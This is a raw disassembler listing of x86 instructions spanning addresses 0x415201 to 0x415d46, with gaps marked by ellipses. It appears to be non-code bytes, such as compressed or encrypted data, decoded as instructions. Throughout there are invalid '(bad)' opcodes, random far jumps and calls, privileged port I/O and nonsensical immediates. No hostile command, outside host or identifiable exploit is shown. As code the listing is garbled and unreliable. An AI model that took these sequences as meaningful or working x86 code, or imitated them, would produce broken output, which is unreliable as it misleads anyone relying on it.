  415201:	sub    DWORD PTR [ebx-0x6c],edx
  415204:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415205:	add    ebx,DWORD PTR [ecx+ebp*8]
  415208:	cmp    BYTE PTR [edx-0xc86c8f9],dl
  41520e:	xchg   edx,eax
  41520f:	ds xor eax,0x41184627
  415215:	cmp    dl,ah
  415217:	ret    
  415218:	inc    esp
  415219:	test   eax,0x317b547d
  41521e:	xor    BYTE PTR [esi-0x252891d1],bl
  415224:	xor    bl,BYTE PTR [ecx+0xf020e94]
  41522a:	fstp   DWORD PTR [ebp+ecx*8+0x71b50677]
  415231:	or     DWORD PTR [ebx],ebp
  415233:	mov    edi,0xb5d413fa
  415238:	test   BYTE PTR [eax],al
  41523a:	or     eax,0x590c1469
  41523f:	mov    esi,0x3424
	...
  4152b4:	add    DWORD PTR [ecx-0x2122293],eax
  4152ba:	mov    cl,0xdd
  4152bc:	stos   BYTE PTR es:[edi],al
  4152bd:	dec    edx
  4152be:	out    0x6e,al
  4152c0:	jns    0x41531b
  4152c2:	ds xor al,0x6e
  4152c5:	call   0x13752ca
  4152ca:	add    BYTE PTR [eax],al
  4152cc:	stc    
  4152cd:	jb     0x415332
  4152cf:	mov    edi,0x11f3e8f4
  4152d4:	fnstcw WORD PTR [edi+0x27739488]
  4152da:	outs   dx,DWORD PTR ds:[esi]
  4152db:	mov    gs,WORD PTR [esi]
  4152dd:	call   0xa2b8d3ed
  4152e2:	xchg   DWORD PTR [esi+edi*1+0x5f74e1e6],ebp
  4152e9:	stos   DWORD PTR es:[edi],eax
  4152ea:	(bad)  [eax]
  4152ec:	mov    esi,0xbfc251ff
  4152f1:	add    esi,esi
  4152f3:	push   edx
  4152f4:	xor    al,dh
  4152f6:	clc    
  4152f7:	(bad)  
  4152f9:	retf   0xec8b
  4152fc:	jge    0x415284
  4152fe:	mov    es,WORD PTR [edx+0x5f094bc7]
  415304:	stc    
  415305:	mov    al,ds:0x639f3afd
  41530a:	cdq    
  41530b:	mov    cl,0x30
  41530d:	mov    dh,0xfc
  41530f:	cmc    
  415310:	lds    edx,FWORD PTR [ecx-0x5c4064c0]
  415316:	mov    ds:0xcdfe17a5,al
  41531b:	mov    DWORD PTR [ebx],ebx
  41531d:	sar    DWORD PTR [esi-0x6],0xc6
  415321:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415322:	ret    
  415323:	dec    ebx
  415324:	imul   eax,DWORD PTR [edx+0x34],0xda9efa43
  41532b:	adc    esp,DWORD PTR [esi+0x48020506]
  415331:	fidivr WORD PTR [edi-0x67]
  415334:	push   esi
  415335:	imul   edx,DWORD PTR ss:[ebx-0x5226ff42],0x24826554
  415340:	sbb    bh,bh
  415342:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415343:	les    edi,FWORD PTR [ebp+0x74]
  415346:	fwait
  415347:	push   ebp
  415348:	sub    al,0xf0
  41534a:	push   ebp
  41534b:	fbstp  TBYTE PTR [ecx-0x5d21688d]
  415351:	out    0xd5,al
  415353:	call   DWORD PTR [ebx]
  415355:	sub    BYTE PTR [edi],dh
  415357:	pushf  
  415358:	dec    esp
  415359:	adc    DWORD PTR [edi-0x4],ecx
  41535c:	pop    edx
  41535d:	mov    cl,0x4d
  41535f:	clc    
  415360:	dec    edx
  415361:	fwait
  415362:	xor    eax,0xd986ff5e
  415367:	test   DWORD PTR [edx-0x7be0e6f0],edx
  41536d:	or     ch,ah
  41536f:	mov    esi,0xf4df81e1
  415374:	pushf  
  415375:	pushf  
  415376:	arpl   WORD PTR [edi-0x43],si
  415379:	xchg   ebp,eax
  41537a:	mov    BYTE PTR [ecx],al
  41537c:	lods   eax,DWORD PTR ds:[esi]
  41537d:	stos   BYTE PTR es:[edi],al
  41537e:	sub    ecx,DWORD PTR [edi+edx*8+0x55d3d5d3]
  415385:	mov    cl,BYTE PTR es:[ebx+0x25]
  415389:	repnz and DWORD PTR [ecx+0x5a2e6724],ecx
  415390:	cs lahf 
  415392:	call   0xbb3141d6
  415397:	into   
  415398:	pop    es
  415399:	ficom  DWORD PTR ds:0x6cadba02
  41539f:	lahf   
  4153a0:	sub    eax,0x96a1b5ce
  4153a5:	sub    ch,BYTE PTR [ebp-0x5a]
  4153a8:	or     BYTE PTR [ebp-0x56282fb0],0x7b
  4153af:	fxch   st(3)
  4153b1:	mov    ah,0xa0
  4153b3:	es in  al,0x9a
  4153b6:	icebp  
  4153b7:	(bad)  
  4153b8:	aaa    
  4153b9:	sub    DWORD PTR [ecx-0x64b8bcad],esp
  4153bf:	sbb    bh,ah
  4153c1:	rol    BYTE PTR [eax],1
	...
  415433:	add    BYTE PTR [ebx+0x73],bl
  415436:	inc    edx
  415437:	or     eax,0x775f3d6a
  41543c:	leave  
  41543d:	bnd jl 0x4153de
  415440:	inc    ebx
  415441:	dec    esp
  415442:	not    dl
  415444:	fs jmp 0x137544a
  41544a:	add    BYTE PTR [eax],al
  41544c:	repnz fsubr st(7),st
  41544f:	aaa    
  415450:	sbb    BYTE PTR [ecx+0x7972eb4a],ah
  415456:	xchg   DWORD PTR ds:0xd0c98f14,edx
  41545c:	daa    
  41545d:	jl     0x415435
  41545f:	ins    BYTE PTR es:[edi],dx
  415460:	jnp    0x41545f
  415462:	std    
  415463:	popa   
  415464:	mov    dl,0x2f
  415466:	sbb    ch,BYTE PTR [ebx]
  415468:	lods   al,BYTE PTR ds:[esi]
  415469:	dec    ebp
  41546a:	cmp    eax,0xb1a50e3d
  41546f:	adc    al,0x41
  415471:	aad    0xbb
  415473:	out    dx,eax
  415474:	sar    DWORD PTR [esi],1
  415476:	dec    ebx
  415477:	call   0xa0377033
  41547c:	dec    esp
  41547d:	mov    dl,bl
  41547f:	(bad)  
  415480:	(bad)  
  415481:	mov    eax,0x256f64f5
  415486:	ret    
  415487:	imul   eax,DWORD PTR [eax-0x1e],0xd19fb1d0
  41548e:	mov    dl,0x29
  415490:	mov    edx,0x1294b1f
  415495:	pop    ss
  415496:	jge    0x41544e
  415498:	rcr    DWORD PTR [ebx-0x21aad5ae],0xd6
  41549f:	push   esi
  4154a0:	mov    edi,DWORD PTR [ebx]
  4154a2:	add    eax,0x77db0d6e
  4154a8:	xchg   esp,eax
  4154a9:	out    0xa1,al
  4154ab:	(bad)  
  4154ac:	push   ecx
  4154ad:	lea    eax,[esi-0x59]
  4154b0:	adc    eax,0x7e1adacb
  4154b5:	cmp    DWORD PTR [esi-0x29],ebx
  4154b8:	js     0x41546a
  4154ba:	popa   
  4154bb:	fs iret 
  4154bd:	xchg   esi,eax
  4154be:	into   
  4154bf:	pop    ds
  4154c0:	dec    ecx
  4154c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154c2:	xor    bh,bl
  4154c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154c5:	xor    eax,0x517075fd
  4154ca:	cmp    eax,0x20e2cc7a
  4154cf:	mov    al,ds:0x41544816
  4154d4:	out    dx,eax
  4154d5:	sub    al,0x1f
  4154d7:	dec    ebx
  4154d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154d9:	xlat   BYTE PTR ds:[ebx]
  4154da:	pop    ss
  4154db:	dec    ecx
  4154dc:	push   esp
  4154dd:	cmp    DWORD PTR [ebx],esi
  4154df:	xor    al,0xd5
  4154e1:	or     eax,0xf17595bb
  4154e6:	or     ebp,eax
  4154e8:	jmp    0x415490
  4154ea:	mov    cl,0xe9
  4154ec:	sbb    al,0xd
  4154ee:	inc    ecx
  4154ef:	cdq    
  4154f0:	or     DWORD PTR [edx+0x26bea99f],edi
  4154f6:	and    al,0xb9
  4154f8:	cs aam 0xd
  4154fb:	jne    0x415505
  4154fd:	inc    esi
  4154fe:	sub    BYTE PTR [ebx],0xd2
  415501:	int    0x21
  415503:	out    dx,al
  415504:	les    edx,FWORD PTR [eax]
  415506:	fmul   DWORD PTR [esi+0x61242b15]
  41550c:	or     DWORD PTR [ebp-0x5e],ebx
  41550f:	sub    al,0x7b
  415511:	int3   
  415512:	dec    ebx
  415513:	jmp    0x415589
  415515:	cmp    ecx,DWORD PTR [ecx+0x5e]
  415518:	push   ebx
  415519:	cmp    cl,ah
  41551b:	push   cs
  41551c:	mov    edx,0x3b4211f3
  415521:	xlat   BYTE PTR ds:[ebx]
  415522:	push   ss
  415523:	sub    al,0x68
  415525:	pop    esp
  415526:	sti    
  415527:	mov    eax,ds:0x3cff1f32
  41552c:	repnz iret 
  41552e:	adc    eax,DWORD PTR [edx+0x4123d433]
  415534:	xchg   DWORD PTR [ebp-0x4b],esi
  415537:	mov    cl,0xf3
  415539:	lds    ebx,FWORD PTR [edi]
  41553b:	xor    eax,0x4243674e
  415540:	sbb    eax,edi
	...
  4155b2:	add    BYTE PTR [eax],al
  4155b4:	jg     0x415614
  4155b6:	cmc    
  4155b7:	ins    DWORD PTR es:[edi],dx
  4155b8:	cmc    
  4155b9:	out    dx,eax
  4155ba:	call   FWORD PTR [esi-0x5a]
  4155bd:	sub    BYTE PTR [esi+0x31],al
  4155c0:	lock cdq 
  4155c2:	pop    ebp
  4155c3:	push   eax
  4155c4:	pop    edx
  4155c5:	jmp    0x0:0xf60000
  4155cc:	lock jno 0x415563
  4155cf:	mov    esp,0x51225358
  4155d4:	call   0xb7285efb
  4155d9:	mov    bl,0xe9
  4155db:	mov    dl,0xa0
  4155dd:	fisub  WORD PTR [esp+ebx*8]
  4155e0:	call   0x6812:0x683a0f7e
  4155e7:	mov    ah,0x47
  4155e9:	xchg   DWORD PTR [eax+0x6b],esi
  4155ec:	ficomp WORD PTR [edi+0x5e1375b8]
  4155f2:	(bad)  
  4155f3:	les    eax,FWORD PTR [edx-0x5e45564]
  4155f9:	shl    DWORD PTR es:[ebp+0x416d5543],cl
  415600:	push   edi
  415601:	hlt    
  415602:	(bad)  
  415603:	inc    ecx
  415604:	outs   dx,DWORD PTR ds:[esi]
  415605:	or     ah,BYTE PTR [ebx+0x5d46232f]
  41560b:	cmp    ebx,esp
  41560d:	xor    DWORD PTR [edx-0x6f791454],ecx
  415613:	push   ebp
  415614:	lds    esp,FWORD PTR [ebp+0x60]
  415617:	push   esp
  415618:	test   DWORD PTR [ebx],esp
  41561a:	jo     0x415644
  41561c:	(bad)  
  41561d:	or     eax,0xf743ca95
  415622:	and    eax,DWORD PTR [eax]
  415624:	jle    0x41566c
  415626:	adc    eax,0x1dd5a4b2
  41562b:	lods   eax,DWORD PTR ds:[esi]
  41562c:	data16 (bad) 
  41562f:	bound  edx,QWORD PTR [eax]
  415631:	mov    esp,0xf75130c6
  415636:	mov    al,ds:0x42c2f9d0
  41563b:	dec    edi
  41563c:	ret    
  41563d:	mov    esp,0xc35f5d7f
  415642:	xor    DWORD PTR [edi],0xcf04c1c9
  415648:	shl    BYTE PTR [eax+0x34207637],0x1e
  41564f:	push   ds
  415650:	push   ecx
  415651:	daa    
  415652:	aaa    
  415653:	(bad)  
  415654:	fsub   QWORD PTR [eax-0x70]
  415657:	push   edi
  415658:	data16 je 0x41567e
  41565b:	inc    ecx
  41565c:	call   0x1391333f
  415661:	cmp    eax,0x2501fb1e
  415666:	fwait
  415667:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415668:	fdivr  DWORD PTR [edx]
  41566a:	popa   
  41566b:	jbe    0x4155f5
  41566d:	pop    ebp
  41566e:	and    eax,0x2e525a21
  415673:	xlat   BYTE PTR ds:[ebx]
  415674:	jb     0x4156bb
  415676:	jle    0x4156ea
  415678:	sbb    DWORD PTR [ecx-0x503a90be],ecx
  41567e:	fld    QWORD PTR es:[ebp-0x1897a362]
  415685:	mov    edi,0x9a926f05
  41568a:	mov    al,ds:0xec41f138
  41568f:	cli    
  415690:	pusha  
  415691:	addr16 push ss
  415693:	test   eax,0x4abfc7d6
  415698:	xchg   ebx,ebx
  41569a:	fs stc 
  41569c:	lock inc ebp
  41569e:	loopne 0x4156ab
  4156a0:	add    eax,0xe91a87c0
  4156a5:	and    DWORD PTR [edx],edx
  4156a7:	add    ebp,DWORD PTR [edi+0x26b52b2d]
  4156ad:	popa   
  4156ae:	add    eax,0x7ed65799
  4156b3:	jle    0x41563e
  4156b5:	std    
  4156b6:	adc    eax,0x2f66d533
  4156bb:	(bad)  
  4156bc:	cmp    bl,dl
  4156be:	dec    ebx
  4156bf:	das    
  4156c0:	out    dx,al
  4156c1:	dec    ebx
	...
  415732:	add    BYTE PTR [eax],al
  415734:	jle    0x415765
  415736:	add    DWORD PTR [ebp+0x51],ebp
  415739:	outs   dx,DWORD PTR ds:[esi]
  41573a:	jle    0x41577b
  41573c:	dec    esp
  41573d:	xchg   esp,eax
  41573e:	call   0x708b31d3
  415743:	dec    esp
  415744:	push   eax
  415745:	jmp    0x415747
  415747:	add    dh,dh
  415749:	add    BYTE PTR [eax],al
  41574b:	add    BYTE PTR [ebx],al
  41574d:	dec    esi
  41574e:	int    0xc2
  415750:	mov    DWORD PTR [ebp+0x4313776b],ecx
  415756:	popa   
  415757:	out    dx,al
  415758:	hlt    
  415759:	leave  
  41575a:	arpl   WORD PTR [ecx-0x4e],ax
  41575d:	mov    esi,DWORD PTR [eax+0x7d536c03]
  415763:	iret   
  415764:	daa    
  415765:	sbb    al,0xc7
  415767:	rcr    BYTE PTR [edx-0x8a7eaa7],1
  41576d:	fnstenv [edx+0x2bc11307]
  415773:	cmp    DWORD PTR [ebx],ebx
  415775:	mov    esp,0xf7bcbb06
  41577a:	pop    es
  41577b:	iret   
  41577c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41577d:	pop    ds
  41577e:	test   al,0x71
  415780:	mov    esi,DWORD PTR [edi-0x5f]
  415783:	out    0x44,al
  415785:	inc    esp
  415786:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415787:	inc    ecx
  415788:	es int 0xd6
  41578b:	cmc    
  41578c:	dec    ebx
  41578d:	fucomp st(1)
  41578f:	jno    0x415776
  415791:	push   ebx
  415792:	pop    edx
  415793:	fwait
  415794:	mov    edi,fs
  415796:	xchg   ebp,eax
  415797:	xchg   DWORD PTR [ebp-0x7ac5e445],eax
  41579d:	jmp    0xddb1db68
  4157a2:	lds    ebx,FWORD PTR [esi-0x6b2b8a12]
  4157a8:	fisttp QWORD PTR [edi]
  4157aa:	ins    DWORD PTR es:[edi],dx
  4157ab:	and    dl,al
  4157ad:	hlt    
  4157ae:	push   cs
  4157af:	add    al,0xf4
  4157b1:	repnz pop edi
  4157b3:	inc    edx
  4157b4:	and    DWORD PTR [ecx],eax
  4157b6:	ins    BYTE PTR es:[edi],dx
  4157b7:	sbb    ah,BYTE PTR [ecx-0x3b]
  4157ba:	arpl   WORD PTR [ecx+0x17502912],si
  4157c0:	iret   
  4157c1:	sahf   
  4157c2:	sub    BYTE PTR [ebx],dh
  4157c4:	push   ebp
  4157c5:	aad    0x1b
  4157c7:	ins    DWORD PTR es:[edi],dx
  4157c8:	mov    bl,BYTE PTR fs:[ebp-0x31]
  4157cc:	adc    DWORD PTR [ebp+0x7a20b2d3],edx
  4157d2:	jmp    0x4157c3
  4157d4:	jmp    0x64abd3b3
  4157d9:	call   0xef41b584
  4157de:	mov    ah,0xed
  4157e0:	mov    al,ds:0xcbcc9c4d
  4157e5:	or     esp,DWORD PTR [ecx+0x6]
  4157e8:	xor    eax,0x654563c0
  4157ed:	test   al,0x42
  4157ef:	sub    BYTE PTR [ecx],cl
  4157f1:	pop    edi
  4157f2:	ja     0x4157df
  4157f4:	pop    ds
  4157f5:	pop    ds
  4157f6:	and    DWORD PTR [eax+0x287551c5],ecx
  4157fc:	test   al,0xfa
  4157fe:	rcr    BYTE PTR [edi-0x743fe64d],0x3c
  415805:	ins    DWORD PTR es:[edi],dx
  415806:	mov    BYTE PTR [ecx-0x6037f64],al
  41580c:	in     al,0x70
  41580e:	or     eax,0x2618ef98
  415813:	mov    ch,0x8e
  415815:	shr    DWORD PTR [edi],1
  415817:	ds mov dl,0xa0
  41581a:	fisttp QWORD PTR [ecx]
  41581c:	outs   dx,DWORD PTR ds:[esi]
  41581d:	push   edx
  41581e:	lods   eax,DWORD PTR ds:[esi]
  41581f:	xor    eax,0x86a9fb4f
  415824:	cmp    BYTE PTR [ebp-0x21cdd559],0xeb
  41582b:	jne    0x4157ba
  41582d:	jo     0x41585d
  41582f:	call   0x9d0b4bb8
  415834:	sbb    edi,esp
  415836:	push   esi
  415837:	sub    DWORD PTR [eax],ebx
  415839:	inc    ebx
  41583a:	cmc    
  41583b:	call   0x888f5945
  415840:	ret    0x52
	...
  4158b3:	add    BYTE PTR [ebx],cl
  4158b5:	jle    0x415889
  4158b7:	and    esi,edi
  4158b9:	scas   eax,DWORD PTR es:[edi]
  4158ba:	sti    
  4158bb:	jle    0x41583e
  4158bd:	inc    eax
  4158be:	sbb    eax,0x2b77fafe
  4158c3:	rol    BYTE PTR [esi-0x14],1
  4158c6:	add    BYTE PTR [eax],al
  4158c8:	test   BYTE PTR [eax],0x0
  4158cb:	add    BYTE PTR [ebx-0x694d78c5],bh
  4158d1:	ficom  DWORD PTR [eax]
  4158d3:	cdq    
  4158d4:	test   BYTE PTR [edi-0x1d994d7f],ah
  4158da:	mov    ebp,0xed78100c
  4158df:	shr    BYTE PTR [edx],0x91
  4158e2:	and    edi,DWORD PTR [ecx-0x23dffa4d]
  4158e8:	adc    al,BYTE PTR [edi]
  4158ea:	pusha  
  4158eb:	push   esi
  4158ec:	jb     0x41591e
  4158ee:	and    ebp,esp
  4158f0:	inc    edi
  4158f1:	adc    BYTE PTR [esi+eax*4+0x61e7cae9],bl
  4158f8:	dec    eax
  4158f9:	jmp    0x41592c
  4158fb:	scas   ax,WORD PTR es:[edi]
  4158fd:	inc    edx
  4158fe:	add    eax,0x24a137cc
  415903:	push   edi
  415904:	sub    al,0x6d
  415906:	retf   
  415907:	jmp    0x1d14cf3b
  41590c:	test   DWORD PTR [esi],esi
  41590e:	mov    ds:0x49e08114,eax
  415913:	jnp    0x415979
  415915:	pop    esp
  415917:	loop   0x4158bc
  415919:	out    0xf8,eax
  41591b:	xor    BYTE PTR [edx],dl
  41591d:	iret   
  41591e:	ja     0x415949
  415920:	cmp    dh,BYTE PTR [ecx]
  415922:	pop    ds
  415923:	adc    al,0x78
  415925:	popa   
  415926:	jne    0x415900
  415928:	repnz retf 
  41592a:	mov    al,ds:0x2fc9baa4
  41592f:	rcr    DWORD PTR [esi],cl
  415931:	mov    esp,0x572644c9
  415936:	xor    eax,0xa7e3ad37
  41593b:	push   ebx
  41593c:	push   edi
  41593d:	cs jns 0x41591a
  415940:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415941:	idiv   DWORD PTR [edi]
  415943:	aaa    
  415944:	shr    BYTE PTR [esi+ebx*1],cl
  415947:	pop    edx
  415948:	aad    0x40
  41594a:	pop    ebp
  41594b:	jno    0x4158ed
  41594d:	adc    esi,DWORD PTR [edx-0x72d1a41]
  415953:	sub    DWORD PTR [eax],edi
  415955:	ds jae 0x415902
  415958:	xor    BYTE PTR [ebx],cl
  41595a:	mov    ebp,0xc94c16a8
  41595f:	mov    ebx,0xc04d08d2
  415964:	sub    al,0x37
  415966:	jecxz  0x4158f2
  415968:	retf   
  415969:	jmp    0x5bad:0x49b336fd
  415970:	pop    edx
  415971:	mov    esp,edi
  415973:	sub    DWORD PTR [ecx],ebp
  415975:	cmp    dl,BYTE PTR [ecx-0xf]
  415978:	repnz dec edi
  41597a:	in     eax,0xb1
  41597c:	jp     0x4159ca
  41597e:	(bad)  
  41597f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415980:	fimul  WORD PTR [edx+0x54277916]
  415986:	mov    dl,0xb7
  415988:	push   ecx
  415989:	add    al,0x29
  41598b:	jae    0x415923
  41598d:	int3   
  41598e:	bnd jmp 0x41595d
  415991:	mov    ecx,0x41953c06
  415996:	mov    DWORD PTR [edi+0x51],0xa24f2af9
  41599d:	xchg   edi,eax
  41599e:	mov    ebp,0xf87ef71b
  4159a3:	pushf  
  4159a4:	rol    BYTE PTR [esi],cl
  4159a6:	jb     0x415944
  4159a8:	push   esi
  4159a9:	sbb    ecx,DWORD PTR [esi+eiz*2]
  4159ac:	adc    edx,ebp
  4159ae:	fidiv  WORD PTR [ecx+0x15]
  4159b1:	mov    ch,0xff
  4159b3:	jg     0x415947
  4159b5:	das    
  4159b6:	ins    DWORD PTR es:[edi],dx
  4159b7:	adc    edx,DWORD PTR [eax-0x1a]
  4159ba:	xchg   edi,eax
  4159bb:	or     eax,0x57b1451e
  4159c0:	ins    DWORD PTR es:[edi],dx
  4159c1:	aas    
	...
  415a32:	add    BYTE PTR [eax],al
  415a34:	lahf   
  415a35:	fnstcw WORD PTR [esi]
  415a37:	ss jle 0x415a31
  415a3a:	lahf   
  415a3b:	stc    
  415a3c:	inc    ecx
  415a3d:	jb     0x415a8e
  415a3f:	lahf   
  415a40:	mov    DWORD PTR [eax+esi*1+0xed3cd2],edx
  415a47:	add    dh,dh
  415a49:	add    BYTE PTR [eax],al
  415a4b:	add    ch,ch
  415a4d:	fcomp  QWORD PTR [eax+0x7c]
  415a50:	push   ecx
  415a51:	jmp    0x415a58
  415a53:	jbe    0x415a83
  415a55:	js     0x415a2d
  415a57:	movhps xmm0,QWORD PTR [eax]
  415a5a:	lock xor DWORD PTR [edx],eax
  415a5d:	cmp    al,0xf7
  415a5f:	ficomp DWORD PTR ds:0x125e3568
  415a65:	adc    al,bl
  415a67:	mov    esi,0xb9363fd8
  415a6c:	push   0x1d
  415a6e:	mov    esp,0x73447419
  415a73:	sub    DWORD PTR [edi-0x34770fcd],eax
  415a79:	cmp    bh,BYTE PTR [ebp+0x50]
  415a7c:	xlat   BYTE PTR ds:[ebx]
  415a7d:	shl    DWORD PTR [eax-0x34],0x63
  415a81:	xor    al,0x3c
  415a83:	mov    bh,0xc4
  415a85:	in     eax,0xd0
  415a87:	into   
  415a88:	cli    
  415a89:	clc    
  415a8a:	mov    ebp,0xaa24a6bf
  415a8f:	and    al,0x65
  415a91:	cdq    
  415a92:	mov    ds:0x173e2a32,eax
  415a97:	add    eax,0x1e6530ac
  415a9c:	repnz test eax,0xae43d359
  415aa2:	cmp    al,0x61
  415aa4:	int    0xd3
  415aa6:	push   ss
  415aa7:	and    eax,DWORD PTR [ebx]
  415aa9:	add    al,0xf7
  415aab:	jno    0x415a80
  415aad:	cmc    
  415aae:	push   ds
  415aaf:	sbb    al,0xfb
  415ab1:	push   cs
  415ab2:	les    esp,FWORD PTR [edx+0x13b76145]
  415ab8:	jnp    0x415abe
  415aba:	int    0x3a
  415abc:	aam    0x72
  415abe:	pop    ds
  415abf:	fwait
  415ac0:	stc    
  415ac1:	mov    al,ds:0x868b131e
  415ac6:	jbe    0x415a74
  415ac8:	add    eax,0x57bd7f81
  415acd:	jns    0x415a83
  415acf:	(bad)  
  415ad1:	repnz xor al,bh
  415ad4:	adc    BYTE PTR [esi-0x6c],ah
  415ad7:	sti    
  415ad8:	outs   dx,BYTE PTR ds:[esi]
  415ad9:	je     0x415a5e
  415adb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415adc:	cmp    DWORD PTR [edx-0x93ce953],eax
  415ae2:	push   esp
  415ae3:	outs   dx,DWORD PTR ds:[esi]
  415ae4:	stc    
  415ae5:	and    eax,0x860c5c58
  415aea:	repz fld TBYTE PTR [eax]
  415aed:	popf   
  415aee:	dec    edi
  415aef:	xchg   esi,eax
  415af0:	popf   
  415af1:	aas    
  415af2:	jle    0x415aa1
  415af4:	jp     0x415b61
  415af6:	leave  
  415af7:	push   ebp
  415af8:	pop    edi
  415af9:	repz cld 
  415afb:	fld    st(7)
  415afd:	stos   BYTE PTR es:[edi],al
  415afe:	enter  0x6a0d,0x85
  415b02:	std    
  415b03:	cmp    BYTE PTR [esi+0x3b9286cc],dl
  415b09:	and    DWORD PTR [eax],0x75
  415b0c:	jns    0x415b50
  415b0e:	add    DWORD PTR [ebp-0x21],0xffffffe4
  415b12:	inc    esi
  415b13:	add    ecx,DWORD PTR [eax+eiz*8]
  415b16:	(bad)  
  415b17:	xor    eax,0x7c2d8751
  415b1c:	xor    edi,DWORD PTR [ecx]
  415b1e:	mov    fs,WORD PTR [esi]
  415b20:	rol    DWORD PTR [eax+0x52c6c896],0xf8
  415b27:	push   eax
  415b28:	push   ss
  415b29:	mov    edx,esp
  415b2b:	icebp  
  415b2c:	adc    al,0x2e
  415b2e:	ins    BYTE PTR es:[edi],dx
  415b2f:	outs   dx,DWORD PTR ds:[esi]
  415b30:	cmp    DWORD PTR [edi-0x70a0def3],ebp
  415b36:	push   ss
  415b37:	mov    ds:0xe8fbddfe,al
  415b3c:	rol    ch,1
  415b3e:	jg     0x415ad8
  415b40:	adc    al,0x79
	...
  415bb2:	add    BYTE PTR [eax],al
  415bb4:	xor    al,0x64
  415bb6:	push   ds
  415bb7:	jl     0x415c17
  415bb9:	jle    0x415c31
  415bbb:	ins    BYTE PTR es:[edi],dx
  415bbc:	pop    ds
  415bbd:	dec    DWORD PTR [edi+0x5a]
  415bc0:	pushf  
  415bc1:	nop
  415bc2:	pop    edx
  415bc3:	dec    ebx
  415bc4:	xor    ch,dh
  415bc6:	add    BYTE PTR [eax],al
  415bc8:	test   BYTE PTR [eax],0x0
  415bcb:	add    BYTE PTR [ebp+ecx*2-0x78],dh
  415bcf:	dec    edi
  415bd0:	or     ecx,DWORD PTR [eax-0x75167e4b]
  415bd6:	jne    0x415b9f
  415bd8:	lds    esp,FWORD PTR [ecx+0x38]
  415bdb:	int    0x68
  415bdd:	mov    dl,0x8e
  415bdf:	aas    
  415be0:	xor    BYTE PTR [ebp+0x4949f031],al
  415be6:	mov    DWORD PTR [esi+esi*8+0x61],edx
  415bea:	in     al,dx
  415beb:	inc    ecx
  415bec:	out    0xa6,al
  415bee:	sub    cl,ch
  415bf0:	push   esp
  415bf1:	mov    ch,0x28
  415bf3:	cli    
  415bf4:	scas   eax,DWORD PTR es:[edi]
  415bf5:	xchg   esp,eax
  415bf6:	and    DWORD PTR [ecx-0xe],0xffffff92
  415bfa:	sbb    esi,DWORD PTR [eax-0x5c6c226]
  415c00:	loopne 0x415b9e
  415c02:	mov    ch,0x1
  415c04:	pop    ecx
  415c05:	jecxz  0x415bc0
  415c07:	sbb    al,0xf9
  415c09:	mov    ch,0x4b
  415c0b:	in     al,dx
  415c0c:	jns    0x415c64
  415c0e:	jns    0x415c73
  415c10:	xchg   DWORD PTR [esi+0x43],edi
  415c13:	jnp    0x415c8d
  415c15:	push   esp
  415c16:	adc    BYTE PTR [ebp+0x69666911],0x19
  415c1d:	shl    BYTE PTR [edi+0x5],1
  415c20:	loopne 0x415bbb
  415c22:	(bad)  
  415c24:	jl     0x415c64
  415c26:	dec    ebp
  415c27:	fmul   st,st(6)
  415c29:	adc    al,0xef
  415c2b:	lea    esi,[edx-0x2b953af]
  415c31:	in     al,0x83
  415c33:	and    ch,bh
  415c35:	sub    al,bl
  415c37:	lea    esp,[eax-0x64]
  415c3a:	mov    bl,0x39
  415c3c:	xlat   BYTE PTR es:[ebx]
  415c3e:	push   0xffffff96
  415c40:	outs   dx,BYTE PTR ds:[esi]
  415c41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c42:	dec    edx
  415c43:	ss push edi
  415c45:	xchg   esp,eax
  415c46:	or     DWORD PTR [eax-0x5ed6c6fb],esp
  415c4c:	add    al,0xcd
  415c4e:	mov    DWORD PTR [ecx+esi*4],edx
  415c51:	jmp    0x415c74
  415c53:	in     eax,0xa7
  415c55:	mov    cl,0x55
  415c57:	test   DWORD PTR [ebx-0x6],ebp
  415c5a:	jnp    0x415cc1
  415c5c:	dec    edi
  415c5d:	jecxz  0x415be0
  415c5f:	dec    eax
  415c60:	cmp    eax,0x9b137354
  415c65:	fcmovb st,st(0)
  415c67:	xchg   ecx,eax
  415c68:	adc    BYTE PTR [ebx+eax*2+0x1ad5111c],al
  415c6f:	fwait
  415c70:	pop    eax
  415c71:	inc    edx
  415c72:	inc    eax
  415c73:	sub    DWORD PTR [edx],esp
  415c75:	les    esp,FWORD PTR [ecx+eax*4-0x30]
  415c79:	(bad)  
  415c7a:	xchg   esi,eax
  415c7b:	cmp    ah,al
  415c7d:	mov    dl,0x53
  415c7f:	hlt    
  415c80:	shr    BYTE PTR ds:0xf2faa561,cl
  415c86:	jo     0x415c7c
  415c88:	push   cs
  415c89:	push   eax
  415c8a:	dec    eax
  415c8b:	or     al,0xf4
  415c8d:	xlat   BYTE PTR ds:[ebx]
  415c8e:	lds    edi,FWORD PTR [esi+0x49e7c19e]
  415c94:	xlat   BYTE PTR ds:[ebx]
  415c95:	aaa    
  415c96:	push   eax
  415c97:	xor    BYTE PTR [edi-0x76],0x8a
  415c9b:	cwde   
  415c9c:	xor    al,0x58
  415c9e:	icebp  
  415c9f:	out    dx,eax
  415ca0:	inc    ebp
  415ca1:	aas    
  415ca2:	cwde   
  415ca3:	loop   0x415c99
  415ca5:	fidivr WORD PTR [ebp-0x52]
  415ca8:	push   ss
  415ca9:	pop    eax
  415caa:	data16 jge 0x415cf0
  415cad:	jmp    0x90d1:0x451df44e
  415cb4:	int    0x31
  415cb6:	daa    
  415cb7:	xor    edx,DWORD PTR [edi-0x42]
  415cba:	and    eax,0xea63d771
  415cbf:	pop    eax
  415cc0:	mov    ds,WORD PTR [ebx+0x0]
	...
  415d32:	add    BYTE PTR [eax],al
  415d34:	mov    bh,0x99
  415d36:	adc    dl,BYTE PTR [ecx-0x404864c2]
  415d3c:	pop    ebp
  415d3d:	jmp    0xff3:0xf928e72f
  415d44:	sub    bh,ch
  415d46:	add    BYTE PTR [eax],al
